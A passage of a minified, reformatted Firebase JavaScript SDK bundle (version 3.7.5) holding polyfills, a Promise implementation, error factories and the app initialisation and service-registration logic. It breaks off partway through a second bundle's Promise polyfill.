var firebase = null;
(function () {
  var aa = function (a) {
      var b = 0;
      return function () {
        return b < a.length ? { done: !1, value: a[b++] } : { done: !0 };
      };
    },
    ba =
      "function" == typeof Object.defineProperties
        ? Object.defineProperty
        : function (a, b, c) {
            return (
              a == Array.prototype || a == Object.prototype || (a[b] = c.value),
              a
            );
          },
    da = (function (a) {
      a = [
        "object" == typeof globalThis && globalThis,
        a,
        "object" == typeof window && window,
        "object" == typeof self && self,
        "object" == typeof global && global,
      ];
      for (var b = 0; b < a.length; ++b) {
        var c = a[b];
        if (c && c.Math == Math) return c;
      }
      throw Error("Cannot find global object");
    })(this);
  !(function (a, b) {
    if (b)
      a: {
        var c = da;
        a = a.split(".");
        for (var d = 0; d < a.length - 1; d++) {
          var e = a[d];
          if (!(e in c)) break a;
          c = c[e];
        }
        (b = b((d = c[(a = a[a.length - 1])]))) != d &&
          null != b &&
          ba(c, a, { configurable: !0, writable: !0, value: b });
      }
  })("Symbol", function (a) {
    if (a) return a;
    var b = function (g, k) {
      (this.W = g),
        ba(this, "description", { configurable: !0, writable: !0, value: k });
    };
    b.prototype.toString = function () {
      return this.W;
    };
    var c = "jscomp_symbol_" + ((1e9 * Math.random()) >>> 0) + "_",
      d = 0,
      e = function (g) {
        if (this instanceof e)
          throw new TypeError("Symbol is not a constructor");
        return new b(c + (g || "") + "_" + d++, g);
      };
    return e;
  });
  var l = function (a) {
      var b =
        "undefined" != typeof Symbol && Symbol.iterator && a[Symbol.iterator];
      if (b) return b.call(a);
      if ("number" == typeof a.length) return { next: aa(a) };
      throw Error(String(a) + " is not an iterable or ArrayLike");
    },
    fa = function (a) {
      for (var b, c = []; !(b = a.next()).done; ) c.push(b.value);
      return c;
    },
    ha = function () {
      for (var a = Number(this), b = [], c = a; c < arguments.length; c++)
        b[c - a] = arguments[c];
      return b;
    },
    n = this || self,
    ia = function (a, b, c) {
      return a.call.apply(a.bind, arguments);
    },
    ja = function (a, b, c) {
      if (!a) throw Error();
      if (2 < arguments.length) {
        var d = Array.prototype.slice.call(arguments, 2);
        return function () {
          var e = Array.prototype.slice.call(arguments);
          return Array.prototype.unshift.apply(e, d), a.apply(b, e);
        };
      }
      return function () {
        return a.apply(b, arguments);
      };
    },
    p = function (a, b, c) {
      return (p =
        Function.prototype.bind &&
        -1 != Function.prototype.bind.toString().indexOf("native code")
          ? ia
          : ja).apply(null, arguments);
    },
    ka = function (a, b) {
      var c = Array.prototype.slice.call(arguments, 1);
      return function () {
        var d = c.slice();
        return d.push.apply(d, arguments), a.apply(this, d);
      };
    },
    q = function (a, b) {
      function c() {}
      (c.prototype = b.prototype),
        (a.ma = b.prototype),
        (a.prototype = new c()),
        (a.prototype.constructor = a),
        (a.base = function (d, e, g) {
          for (
            var k = Array(arguments.length - 2), f = 2;
            f < arguments.length;
            f++
          )
            k[f - 2] = arguments[f];
          return b.prototype[e].apply(d, k);
        });
    };
  function r(a, b) {
    if (Error.captureStackTrace) Error.captureStackTrace(this, r);
    else {
      var c = Error().stack;
      c && (this.stack = c);
    }
    a && (this.message = String(a)), void 0 !== b && (this.cause = b);
  }
  function t(a, b) {
    for (var c = "", d = (a = a.split("%s")).length - 1, e = 0; e < d; e++)
      c += a[e] + (e < b.length ? b[e] : "%s");
    r.call(this, c + a[d]);
  }
  function u(a, b, c, d) {
    var e = "Assertion failed";
    if (c) {
      e += ": " + c;
      var g = d;
    } else a && ((e += ": " + a), (g = b));
    throw new t("" + e, g || []);
  }
  q(r, Error),
    (r.prototype.name = "CustomError"),
    q(t, r),
    (t.prototype.name = "AssertionError");
  var z,
    A,
    w = function (a, b, c) {
      a || u("", null, b, Array.prototype.slice.call(arguments, 2));
    },
    x = function (a, b, c) {
      if ("function" != typeof a) {
        var d = typeof a;
        u(
          "Expected function but got %s: %s.",
          [
            (d =
              "object" != d
                ? d
                : a
                ? Array.isArray(a)
                  ? "array"
                  : d
                : "null"),
            a,
          ],
          b,
          Array.prototype.slice.call(arguments, 2)
        );
      }
    },
    y = function (a, b) {
      (this.ba = 100),
        (this.X = a),
        (this.ha = b),
        (this.F = 0),
        (this.D = null);
    };
  (y.prototype.get = function () {
    if (0 < this.F) {
      this.F--;
      var a = this.D;
      (this.D = a.next), (a.next = null);
    } else a = this.X();
    return a;
  }),
    (y.prototype.put = function (a) {
      this.ha(a),
        this.F < this.ba && (this.F++, (a.next = this.D), (this.D = a));
    });
  a: {
    for (var ma = ["CLOSURE_FLAGS"], C = n, D = 0; D < ma.length; D++)
      if (null == (C = C[ma[D]])) {
        A = null;
        break a;
      }
    A = C;
  }
  var na = A && A[610401301];
  function E() {
    var a = n.navigator;
    return a && (a = a.userAgent) ? a : "";
  }
  z = null != na && na;
  var F,
    oa = n.navigator;
  function G(a) {
    return -1 != E().indexOf(a);
  }
  function H() {
    return !!z && !!F && 0 < F.brands.length;
  }
  function pa() {
    return !H() && (G("Trident") || G("MSIE"));
  }
  function I() {
    return !!z && !!F && !!F.platform;
  }
  function qa() {
    return G("iPhone") && !G("iPod") && !G("iPad");
  }
  (F = (oa && oa.userAgentData) || null),
    H() || G("Opera"),
    pa(),
    G("Edge"),
    !G("Gecko") ||
      (-1 != E().toLowerCase().indexOf("webkit") && !G("Edge")) ||
      G("Trident") ||
      G("MSIE") ||
      G("Edge"),
    -1 != E().toLowerCase().indexOf("webkit") && !G("Edge") && G("Mobile"),
    I() || G("Macintosh"),
    I() || G("Windows"),
    (I() ? "Linux" === F.platform : G("Linux")) || I() || G("CrOS"),
    I() || G("Android"),
    qa(),
    G("iPad"),
    G("iPod"),
    qa() || G("iPad") || G("iPod"),
    E().toLowerCase().indexOf("kaios");
  var J = function () {},
    K = function (a) {
      if (ra != ra) throw Error("SafeUrl is not meant to be built directly");
      this.ga = a;
    };
  K.prototype.toString = function () {
    return this.ga.toString();
  };
  var ra = {};
  new K("about:invalid#zClosurez"), new K("about:blank");
  var ta = function () {
    this.fa = "";
  };
  (ta.prototype.toString = function () {
    return this.fa.toString();
  }),
    new ta();
  var va = function () {
    this.ea = "";
  };
  (va.prototype.toString = function () {
    return this.ea.toString();
  }),
    new va();
  var xa = function () {
    var a = (n.trustedTypes && n.trustedTypes.emptyHTML) || "";
    this.da = a;
  };
  (xa.prototype.toString = function () {
    return this.da.toString();
  }),
    new xa();
  var L,
    za = function () {
      var a = n.MessageChannel;
      if (
        (void 0 === a &&
          "undefined" != typeof window &&
          window.postMessage &&
          window.addEventListener &&
          !G("Presto") &&
          (a = function () {
            var e = (function () {
              var a = document,
                b = "IFRAME";
              return (
                "application/xhtml+xml" === a.contentType &&
                  (b = b.toLowerCase()),
                a.createElement(b)
              );
            })();
            (e.style.display = "none"), document.documentElement.appendChild(e);
            var g = e.contentWindow;
            (e = g.document).open(), e.close();
            var k = "callImmediate" + Math.random(),
              f =
                "file:" == g.location.protocol
                  ? "*"
                  : g.location.protocol + "//" + g.location.host;
            (e = p(function (h) {
              ("*" != f && h.origin != f) ||
                h.data != k ||
                this.port1.onmessage();
            }, this)),
              g.addEventListener("message", e, !1),
              (this.port1 = {}),
              (this.port2 = {
                postMessage: function () {
                  g.postMessage(k, f);
                },
              });
          }),
        void 0 !== a && !pa())
      ) {
        var b = new a(),
          c = {},
          d = c;
        return (
          (b.port1.onmessage = function () {
            if (void 0 !== c.next) {
              var e = (c = c.next).M;
              (c.M = null), e();
            }
          }),
          function (e) {
            (d.next = { M: e }), (d = d.next), b.port2.postMessage(0);
          }
        );
      }
      return function (e) {
        n.setTimeout(e, 0);
      };
    };
  function Aa(a) {
    n.setTimeout(function () {
      throw a;
    }, 0);
  }
  var M = function () {
    this.G = this.o = null;
  };
  (M.prototype.add = function (a, b) {
    var c = Ba.get();
    c.set(a, b),
      this.G ? (this.G.next = c) : (w(!this.o), (this.o = c)),
      (this.G = c);
  }),
    (M.prototype.remove = function () {
      var a = null;
      return (
        this.o &&
          ((a = this.o),
          (this.o = this.o.next),
          this.o || (this.G = null),
          (a.next = null)),
        a
      );
    });
  var Ba = new y(
      function () {
        return new Ca();
      },
      function (a) {
        return a.reset();
      }
    ),
    Ca = function () {
      this.next = this.scope = this.fn = null;
    };
  (Ca.prototype.set = function (a, b) {
    (this.fn = a), (this.scope = b), (this.next = null);
  }),
    (Ca.prototype.reset = function () {
      this.next = this.scope = this.fn = null;
    });
  var Da =
      n.console && n.console.createTask
        ? n.console.createTask.bind(n.console)
        : void 0,
    Ea = Da ? Symbol("consoleTask") : void 0;
  function Fa(a, b) {
    function c() {
      var f = ha.apply(0, arguments),
        h = this;
      return k.run(function () {
        return a.call.apply(a, [h].concat(f instanceof Array ? f : fa(l(f))));
      });
    }
    if (((b = void 0 === b ? "anonymous" : b), Ea && a[Ea])) return a;
    var e,
      d = a,
      g = null == (e = undefined) ? void 0 : e();
    if (
      ((a = function () {
        var h,
          f = ha.apply(0, arguments),
          m = null == (h = undefined) ? void 0 : h();
        if (g !== m)
          throw Error(
            b +
              " was scheduled in '" +
              g +
              "' but called in '" +
              m +
              "'.\nMake sure your test awaits all async calls.\n\nTIP: To help investigate, debug the test in Chrome and look at the async portion\nof the call stack to see what originally scheduled the callback.  Then, make the\ntest wait for the relevant asynchronous work to finish."
          );
        return d.call.apply(
          d,
          [this].concat(f instanceof Array ? f : fa(l(f)))
        );
      }),
      !Da)
    )
      return a;
    var k = Da(a.name || b);
    return (
      (c[
        (function (a, b, c) {
          return (
            null == a &&
              u(
                "Expected to exist: %s.",
                [a],
                b,
                Array.prototype.slice.call(arguments, 2)
              ),
            a
          );
        })(Ea)
      ] = k),
      c
    );
  }
  var N,
    Ha = !1,
    Ia = new M(),
    O = function (a, b) {
      N || Ja(),
        Ha || (N(), (Ha = !0)),
        (a = Fa(a, "goog.async.run")),
        Ia.add(a, b);
    },
    Ja = function () {
      if (n.Promise && n.Promise.resolve) {
        var a = n.Promise.resolve(void 0);
        N = function () {
          a.then(Ka);
        };
      } else
        N = function () {
          var b = Ka;
          "function" != typeof n.setImmediate ||
          (n.Window &&
            n.Window.prototype &&
            (H() || !G("Edge")) &&
            n.Window.prototype.setImmediate == n.setImmediate)
            ? (L || (L = za()), L(b))
            : n.setImmediate(b);
        };
    },
    Ka = function () {
      for (var a; (a = Ia.remove()); ) {
        try {
          a.fn.call(a.scope);
        } catch (b) {
          Aa(b);
        }
        Ba.put(a);
      }
      Ha = !1;
    },
    R = function (a, b) {
      if (
        ((this.g = 0),
        (this.U = void 0),
        (this.s = this.i = this.m = null),
        (this.B = this.H = !1),
        a != J)
      )
        try {
          var c = this;
          a.call(
            b,
            function (d) {
              P(c, 2, d);
            },
            function (d) {
              if (!(d instanceof Q))
                try {
                  if (d instanceof Error) throw d;
                  throw Error("Promise rejected.");
                } catch (e) {}
              P(c, 3, d);
            }
          );
        } catch (d) {
          P(this, 3, d);
        }
    },
    La = function () {
      (this.next = this.context = this.u = this.l = this.child = null),
        (this.v = !1);
    };
  La.prototype.reset = function () {
    (this.context = this.u = this.l = this.child = null), (this.v = !1);
  };
  var Ma = new y(
      function () {
        return new La();
      },
      function (a) {
        a.reset();
      }
    ),
    Na = function (a, b, c) {
      var d = Ma.get();
      return (d.l = a), (d.u = b), (d.context = c), d;
    },
    Pa = function (a, b, c) {
      Oa(a, b, c, null) || O(ka(b, a));
    };
  (R.prototype.then = function (a, b, c) {
    return (
      null != a && x(a, "opt_onFulfilled should be a function."),
      null != b &&
        x(
          b,
          "opt_onRejected should be a function. Did you pass opt_context as the second argument instead of the third?"
        ),
      Qa(
        this,
        "function" == typeof a ? a : null,
        "function" == typeof b ? b : null,
        c
      )
    );
  }),
    (R.prototype.$goog_Thenable = !0),
    (R.prototype.V = function (a, b) {
      return Qa(this, null, a, b);
    }),
    (R.prototype.catch = R.prototype.V),
    (R.prototype.cancel = function (a) {
      if (0 == this.g) {
        var b = new Q(a);
        O(function () {
          Ra(this, b);
        }, this);
      }
    });
  var Ra = function (a, b) {
      if (0 == a.g)
        if (a.m) {
          var c = a.m;
          if (c.i) {
            for (
              var d = 0, e = null, g = null, k = c.i;
              k && (k.v || (d++, k.child == a && (e = k), !(e && 1 < d)));
              k = k.next
            )
              e || (g = k);
            e &&
              (0 == c.g && 1 == d
                ? Ra(c, b)
                : (g
                    ? ((d = g),
                      w(c.i),
                      w(null != d),
                      d.next == c.s && (c.s = d),
                      (d.next = d.next.next))
                    : Sa(c),
                  Ta(c, e, 3, b)));
          }
          a.m = null;
        } else P(a, 3, b);
    },
    Va = function (a, b) {
      a.i || (2 != a.g && 3 != a.g) || Ua(a),
        w(null != b.l),
        a.s ? (a.s.next = b) : (a.i = b),
        (a.s = b);
    },
    Qa = function (a, b, c, d) {
      b && (b = Fa(b, "goog.Promise.then")),
        c && (c = Fa(c, "goog.Promise.then"));
      var e = Na(null, null, null);
      return (
        (e.child = new R(function (g, k) {
          (e.l = b
            ? function (f) {
                try {
                  var h = b.call(d, f);
                  g(h);
                } catch (m) {
                  k(m);
                }
              }
            : g),
            (e.u = c
              ? function (f) {
                  try {
                    var h = c.call(d, f);
                    void 0 === h && f instanceof Q ? k(f) : g(h);
                  } catch (m) {
                    k(m);
                  }
                }
              : k);
        })),
        (e.child.m = a),
        Va(a, e),
        e.child
      );
    };
  (R.prototype.ja = function (a) {
    w(1 == this.g), (this.g = 0), P(this, 2, a);
  }),
    (R.prototype.ka = function (a) {
      w(1 == this.g), (this.g = 0), P(this, 3, a);
    });
  var P = function (a, b, c) {
      0 == a.g &&
        (a === c &&
          ((b = 3), (c = new TypeError("Promise cannot resolve to itself"))),
        (a.g = 1),
        Oa(c, a.ja, a.ka, a) ||
          ((a.U = c),
          (a.g = b),
          (a.m = null),
          Ua(a),
          3 != b || c instanceof Q || Wa(a, c)));
    },
    Oa = function (a, b, c, d) {
      if (a instanceof R)
        return (
          null != b && x(b, "opt_onFulfilled should be a function."),
          null != c &&
            x(
              c,
              "opt_onRejected should be a function. Did you pass opt_context as the second argument instead of the third?"
            ),
          Va(a, Na(b || J, c || null, d)),
          !0
        );
      if (a)
        try {
          var e = !!a.$goog_Thenable;
        } catch (k) {
          e = !1;
        }
      else e = !1;
      if (e) return a.then(b, c, d), !0;
      if (("object" == (e = typeof a) && null != a) || "function" == e)
        try {
          var g = a.then;
          if ("function" == typeof g) return Xa(a, g, b, c, d), !0;
        } catch (k) {
          return c.call(d, k), !0;
        }
      return !1;
    },
    Xa = function (a, b, c, d, e) {
      var g = !1,
        f = function (h) {
          g || ((g = !0), d.call(e, h));
        };
      try {
        b.call(
          a,
          function (h) {
            g || ((g = !0), c.call(e, h));
          },
          f
        );
      } catch (h) {
        f(h);
      }
    },
    Ua = function (a) {
      a.H || ((a.H = !0), O(a.Y, a));
    },
    Sa = function (a) {
      var b = null;
      return (
        a.i && ((b = a.i), (a.i = b.next), (b.next = null)),
        a.i || (a.s = null),
        null != b && w(null != b.l),
        b
      );
    };
  R.prototype.Y = function () {
    for (var a; (a = Sa(this)); ) Ta(this, a, this.g, this.U);
    this.H = !1;
  };
  var Ta = function (a, b, c, d) {
      if (3 == c && b.u && !b.v) for (; a && a.B; a = a.m) a.B = !1;
      if (b.child) (b.child.m = null), Ya(b, c, d);
      else
        try {
          b.v ? b.l.call(b.context) : Ya(b, c, d);
        } catch (e) {
          Za.call(null, e);
        }
      Ma.put(b);
    },
    Ya = function (a, b, c) {
      2 == b ? a.l.call(a.context, c) : a.u && a.u.call(a.context, c);
    },
    Wa = function (a, b) {
      (a.B = !0),
        O(function () {
          a.B && Za.call(null, b);
        });
    },
    Za = Aa,
    Q = function (a) {
      r.call(this, a);
    };
  q(Q, r),
    (Q.prototype.name = "cancel"),
    (R.all = function (a) {
      return new R(function (b, c) {
        var d = a.length,
          e = [];
        if (d)
          for (
            var h,
              g = function (m, v) {
                d--, (e[m] = v), 0 == d && b(e);
              },
              k = function (m) {
                c(m);
              },
              f = 0;
            f < a.length;
            f++
          )
            (h = a[f]), Pa(h, ka(g, f), k);
        else b(e);
      });
    }),
    (R.resolve = function (a) {
      if (a instanceof R) return a;
      var b = new R(J);
      return P(b, 2, a), b;
    }),
    (R.reject = function (a) {
      return new R(function (b, c) {
        c(a);
      });
    }),
    (R.prototype.catch = R.prototype.V);
  var $a = R;
  function S(a, b) {
    if (!(b instanceof Object)) return b;
    switch (b.constructor) {
      case Date:
        return new Date(b.getTime());
      case Object:
        void 0 === a && (a = {});
        break;
      case Array:
        a = [];
        break;
      default:
        return b;
    }
    for (var c in b) b.hasOwnProperty(c) && (a[c] = S(a[c], b[c]));
    return a;
  }
  "undefined" != typeof Promise && ($a = Promise);
  var ab = Error.captureStackTrace,
    U = function (a, b) {
      if (((this.code = a), (this.message = b), ab))
        ab(this, T.prototype.create);
      else {
        var c = Error.apply(this, arguments);
        (this.name = "FirebaseError"),
          Object.defineProperty(this, "stack", {
            get: function () {
              return c.stack;
            },
          });
      }
    };
  ((U.prototype = Object.create(Error.prototype)).constructor = U),
    (U.prototype.name = "FirebaseError");
  var T = function (a, b, c) {
    (this.service = a),
      (this.ia = b),
      (this.errors = c),
      (this.pattern = /\{\$([^}]+)}/g);
  };
  T.prototype.create = function (a, b) {
    void 0 === b && (b = {});
    var c = this.errors[a];
    for (var d in ((a = this.service + "/" + a),
    (c =
      void 0 === c
        ? "Error"
        : c.replace(this.pattern, function (e, g) {
            return void 0 !== (e = b[g]) ? e.toString() : "<" + g + "?>";
          })),
    (c = this.ia + ": " + c + " (" + a + ")."),
    (c = new U(a, c)),
    b))
      b.hasOwnProperty(d) && "_" !== d.slice(-1) && (c[d] = b[d]);
    return c;
  };
  var bb = $a;
  function cb(a, b) {
    return (a = new V(a, b)).subscribe.bind(a);
  }
  var V = function (a, b) {
    var c = this;
    (this.h = []),
      (this.T = 0),
      (this.task = bb.resolve()),
      (this.A = !1),
      (this.J = b),
      this.task
        .then(function () {
          a(c);
        })
        .catch(function (d) {
          c.error(d);
        });
  };
  (V.prototype.next = function (a) {
    db(this, function (b) {
      b.next(a);
    });
  }),
    (V.prototype.error = function (a) {
      db(this, function (b) {
        b.error(a);
      }),
        this.close(a);
    }),
    (V.prototype.complete = function () {
      db(this, function (a) {
        a.complete();
      }),
        this.close();
    }),
    (V.prototype.subscribe = function (a, b, c) {
      var d = this;
      if (void 0 === a && void 0 === b && void 0 === c)
        throw Error("Missing Observer.");
      var e = (function eb(a) {
        if ("object" != typeof a || null === a) return !1;
        for (
          var b = l(["next", "error", "complete"]), c = b.next();
          !c.done;
          c = b.next()
        )
          if ((c = c.value) in a && "function" == typeof a[c]) return !0;
        return !1;
      })(a)
        ? a
        : { next: a, error: b, complete: c };
      return (
        void 0 === e.next && (e.next = fb),
        void 0 === e.error && (e.error = fb),
        void 0 === e.complete && (e.complete = fb),
        (a = this.la.bind(this, this.h.length)),
        this.A &&
          this.task.then(function () {
            try {
              d.P ? e.error(d.P) : e.complete();
            } catch (g) {}
          }),
        this.h.push(e),
        a
      );
    }),
    (V.prototype.la = function (a) {
      void 0 !== this.h &&
        void 0 !== this.h[a] &&
        (delete this.h[a],
        --this.T,
        0 === this.T && void 0 !== this.J && this.J(this));
    });
  var db = function (a, b) {
      if (!a.A) for (var c = 0; c < a.h.length; c++) gb(a, c, b);
    },
    gb = function (a, b, c) {
      a.task.then(function () {
        if (void 0 !== a.h && void 0 !== a.h[b])
          try {
            c(a.h[b]);
          } catch (d) {
            "undefined" != typeof console && console.error && console.error(d);
          }
      });
    };
  function fb() {}
  V.prototype.close = function (a) {
    var b = this;
    this.A ||
      ((this.A = !0),
      void 0 !== a && (this.P = a),
      this.task.then(function () {
        (b.h = void 0), (b.J = void 0);
      }));
  };
  var W = $a,
    X = function (a, b, c) {
      var d = this;
      (this.R = c),
        (this.S = !1),
        (this.j = {}),
        (this.I = b),
        (this.K = S(void 0, a)),
        (a = "serviceAccount" in this.K),
        ("credential" in this.K || a) &&
          "undefined" != typeof console &&
          console.log(
            "The '" +
              (a ? "serviceAccount" : "credential") +
              "' property specified in the first argument to initializeApp() is deprecated and will be removed in the next major version. You should instead use the 'firebase-admin' package. See https://firebase.google.com/docs/admin/setup for details on how to get started."
          ),
        Object.keys(c.INTERNAL.factories).forEach(function (e) {
          var g = c.INTERNAL.useAsService(d, e);
          null !== g && ((g = d.aa.bind(d, g)), (d[e] = g));
        });
    };
  (X.prototype.delete = function () {
    var a = this;
    return new W(function (b) {
      Y(a), b();
    })
      .then(function () {
        a.R.INTERNAL.removeApp(a.I);
        var b = [];
        return (
          Object.keys(a.j).forEach(function (c) {
            Object.keys(a.j[c]).forEach(function (d) {
              b.push(a.j[c][d]);
            });
          }),
          W.all(
            b
              .filter(function (c) {
                return "INTERNAL" in c;
              })
              .map(function (c) {
                return c.INTERNAL.delete();
              })
          )
        );
      })
      .then(function () {
        (a.S = !0), (a.j = {});
      });
  }),
    (X.prototype.aa = function (a, b) {
      Y(this), void 0 === this.j[a] && (this.j[a] = {});
      var c = b || "[DEFAULT]";
      return void 0 === this.j[a][c]
        ? ((b = this.R.INTERNAL.factories[a](this, this.Z.bind(this), b)),
          (this.j[a][c] = b))
        : this.j[a][c];
    }),
    (X.prototype.Z = function (a) {
      S(this, a);
    });
  var Y = function (a) {
    a.S && Z("app-deleted", { name: a.I });
  };
  function Z(a, b) {
    throw kb.create(a, b);
  }
  da.Object.defineProperties(X.prototype, {
    name: {
      configurable: !0,
      enumerable: !0,
      get: function () {
        return Y(this), this.I;
      },
    },
    options: {
      configurable: !0,
      enumerable: !0,
      get: function () {
        return Y(this), this.K;
      },
    },
  }),
    (X.prototype.name && X.prototype.options) ||
      X.prototype.delete ||
      console.log("dc");
  var kb = new T("app", "Firebase", {
    "no-app":
      "No Firebase App '{$name}' has been created - call Firebase App.initializeApp()",
    "bad-app-name": "Illegal App name: '{$name}",
    "duplicate-app": "Firebase App named '{$name}' already exists",
    "app-deleted": "Firebase App named '{$name}' already deleted",
    "duplicate-service": "Firebase service named '{$name}' already registered",
    "sa-not-supported":
      "Initializing the Firebase SDK with a service account is only allowed in a Node.js environment. On client devices, you should instead initialize the SDK with an api key and auth domain",
    "invalid-app-argument":
      "firebase.{$name}() takes either no argument or a Firebase App instance.",
  });
  void 0 !== firebase &&
    (firebase = (function hb() {
      function a(f) {
        var h = d[(f = f || "[DEFAULT]")];
        return void 0 === h && Z("no-app", { name: f }), h;
      }
      function b(f, h) {
        Object.keys(e).forEach(function (m) {
          null !== (m = c(f, m)) && g[m] && g[m](h, f);
        });
      }
      function c(f, h) {
        if ("serverAuth" === h) return null;
        var m = h;
        return (
          (f = f.options),
          "auth" === h &&
            (f.serviceAccount || f.credential) &&
            ((m = "serverAuth"), "serverAuth" in e || Z("sa-not-supported")),
          m
        );
      }
      var d = {},
        e = {},
        g = {},
        k = {
          __esModule: !0,
          initializeApp: function (f, h) {
            return (
              void 0 === h
                ? (h = "[DEFAULT]")
                : ("string" != typeof h || "" === h) &&
                  Z("bad-app-name", { name: h + "" }),
              void 0 !== d[h] && Z("duplicate-app", { name: h }),
              (f = new X(f, h, k)),
              (d[h] = f),
              b(f, "create"),
              (null != f.INTERNAL && null != f.INTERNAL.getToken) ||
                S(f, {
                  INTERNAL: {
                    getUid: function () {
                      return null;
                    },
                    getToken: function () {
                      return W.resolve(null);
                    },
                    addAuthTokenListener: function () {},
                    removeAuthTokenListener: function () {},
                  },
                }),
              f
            );
          },
          app: a,
          apps: null,
          Promise: W,
          SDK_VERSION: "0.0.0",
          INTERNAL: {
            registerService: function (f, h, m, v, ib) {
              return (
                e[f] && Z("duplicate-service", { name: f }),
                (e[f] = ib
                  ? h
                  : function (B, jb) {
                      return h(B, jb, "[DEFAULT]");
                    }),
                v && (g[f] = v),
                (v = function (B) {
                  return (
                    void 0 === B && (B = a()),
                    "function" != typeof B[f] &&
                      Z("invalid-app-argument", { name: f }),
                    B[f]()
                  );
                }),
                void 0 !== m && S(v, m),
                (k[f] = v)
              );
            },
            createFirebaseNamespace: hb,
            extendNamespace: function (f) {
              S(k, f);
            },
            createSubscribe: cb,
            ErrorFactory: T,
            removeApp: function (f) {
              b(d[f], "delete"), delete d[f];
            },
            factories: e,
            useAsService: c,
            Promise: R,
            deepExtend: S,
          },
        };
      return (
        (k.default = k),
        Object.defineProperty(k, "apps", {
          get: function () {
            return Object.keys(d).map(function (f) {
              return d[f];
            });
          },
        }),
        (a.App = X),
        k
      );
    })());
}).call(this),
  (firebase.SDK_VERSION = "3.7.5"),
  function () {
    var k,
      aa = function (a) {
        var b = 0;
        return function () {
          return b < a.length ? { done: !1, value: a[b++] } : { done: !0 };
        };
      },
      ba =
        "function" == typeof Object.defineProperties
          ? Object.defineProperty
          : function (a, b, c) {
              return (
                a == Array.prototype ||
                  a == Object.prototype ||
                  (a[b] = c.value),
                a
              );
            },
      ca = function (a) {
        a = [
          "object" == typeof globalThis && globalThis,
          a,
          "object" == typeof window && window,
          "object" == typeof self && self,
          "object" == typeof global && global,
        ];
        for (var b = 0; b < a.length; ++b) {
          var c = a[b];
          if (c && c.Math == Math) return c;
        }
        throw Error("Cannot find global object");
      },
      da = ca(this),
      ea = function (a, b) {
        if (b)
          a: {
            var c = da;
            a = a.split(".");
            for (var d = 0; d < a.length - 1; d++) {
              var e = a[d];
              if (!(e in c)) break a;
              c = c[e];
            }
            (b = b((d = c[(a = a[a.length - 1])]))) != d &&
              null != b &&
              ba(c, a, { configurable: !0, writable: !0, value: b });
          }
      };
    ea("Symbol", function (a) {
      if (a) return a;
      var b = function (f, g) {
        (this.ek = f),
          ba(this, "description", { configurable: !0, writable: !0, value: g });
      };
      b.prototype.toString = function () {
        return this.ek;
      };
      var c = "jscomp_symbol_" + ((1e9 * Math.random()) >>> 0) + "_",
        d = 0,
        e = function (f) {
          if (this instanceof e)
            throw new TypeError("Symbol is not a constructor");
          return new b(c + (f || "") + "_" + d++, f);
        };
      return e;
    }),
      ea("Symbol.iterator", function (a) {
        if (a) return a;
        a = Symbol("Symbol.iterator");
        for (
          var b =
              "Array Int8Array Uint8Array Uint8ClampedArray Int16Array Uint16Array Int32Array Uint32Array Float32Array Float64Array".split(
                " "
              ),
            c = 0;
          c < b.length;
          c++
        ) {
          var d = da[b[c]];
          "function" == typeof d &&
            "function" != typeof d.prototype[a] &&
            ba(d.prototype, a, {
              configurable: !0,
              writable: !0,
              value: function () {
                return fa(aa(this));
              },
            });
        }
        return a;
      });
    var fa = function (a) {
        return (
          ((a = { next: a })[Symbol.iterator] = function () {
            return this;
          }),
          a
        );
      },
      ha = function (a) {
        return (a.raw = a);
      },
      ia = function (a, b) {
        return (a.raw = b), a;
      },
      ja = function (a) {
        var b =
          "undefined" != typeof Symbol && Symbol.iterator && a[Symbol.iterator];
        if (b) return b.call(a);
        if ("number" == typeof a.length) return { next: aa(a) };
        throw Error(String(a) + " is not an iterable or ArrayLike");
      },
      ka = function (a) {
        if (!(a instanceof Array)) {
          a = ja(a);
          for (var b, c = []; !(b = a.next()).done; ) c.push(b.value);
          a = c;
        }
        return a;
      },
      la =
        "function" == typeof Object.create
          ? Object.create
          : function (a) {
              var b = function () {};
              return (b.prototype = a), new b();
            },
      ma;
    if ("function" == typeof Object.setPrototypeOf) ma = Object.setPrototypeOf;
    else {
      var na;
      a: {
        var oa = { a: !0 },
          pa = {};
        try {
          (pa.__proto__ = oa), (na = pa.a);
          break a;
        } catch (a) {}
        na = !1;
      }
      ma = na
        ? function (a, b) {
            if (((a.__proto__ = b), a.__proto__ !== b))
              throw new TypeError(a + " is not extensible");
            return a;
          }
        : null;
    }
    var qa = ma,
      n = function (a, b) {
        if (
          ((a.prototype = la(b.prototype)), (a.prototype.constructor = a), qa)
        )
          qa(a, b);
        else
          for (var c in b)
            if ("prototype" != c)
              if (Object.defineProperties) {
                var d = Object.getOwnPropertyDescriptor(b, c);
                d && Object.defineProperty(a, c, d);
              } else a[c] = b[c];
        a.Id = b.prototype;
      },
      ra = function () {
        for (var a = Number(this), b = [], c = a; c < arguments.length; c++)
          b[c - a] = arguments[c];
        return b;
      };
    ea("Promise", function (a) {
      function b() {
        this.nc = null;
      }
      function c(g) {
        return g instanceof e
          ? g
          : new e(function (h) {
              h(g);
            });
      }
      if (a) return a;
      b.prototype.Rh = function (g) {
        if (null == this.nc) {
          this.nc = [];
          var h = this;
          this.Sh(function () {
            h.Fk();
          });
        }
        this.nc.push(g);
      };
      var d = da.setTimeout;
      (b.prototype.Sh = function (g) {
        d(g, 0);
      }),
        (b.prototype.Fk = function () {
          for (; this.nc && this.nc.length; ) {
            var g = this.nc;
            this.nc = [];
            for (var h = 0; h < g.length; ++h) {
              var l = g[h];
              g[h] = null;
              try {
                l();
              } catch (m) {
                this.mk(m);
              }
            }
          }
          this.nc = null;
        }),
        (b.prototype.mk = function (g) {
          this.Sh(function () {
            throw g;
          });
        });
      var e = function (g) {
        (this.Ba = 0), (this.Ua = void 0), (this.wd = []), (this.Pi = !1);
        var h = this.vg();
        try {
          g(h.resolve, h.reject);
        } catch (l) {
          h.reject(l);
        }
      };
      (e.prototype.vg = function () {
        function g(m) {
          return function (q) {
            l || ((l = !0), m.call(h, q));
          };
        }
        var h = this,
          l = !1;
        return { resolve: g(this.Wl), reject: g(this.sh) };
      }),
        (e.prototype.Wl = function (g) {
          if (g === this)
            this.sh(new TypeError("A Promise cannot resolve to itself"));
          else if (g instanceof e) this.nm(g);
          else {
            a: switch (typeof g) {
              case "object":
                var h = null != g;
                break a;
              case "function":
                h = !0;
                break a;
              default:
                h = !1;
            }
            h ? this.Vl(g) : this.ui(g);
          }
        }),
        (e.prototype.Vl = function (g) {
          var h = void 0;
          try {
            h = g.then;
          } catch (l) {
            return void this.sh(l);
          }
          "function" == typeof h ? this.om(h, g) : this.ui(g);
        }),
        (e.prototype.sh = function (g) {
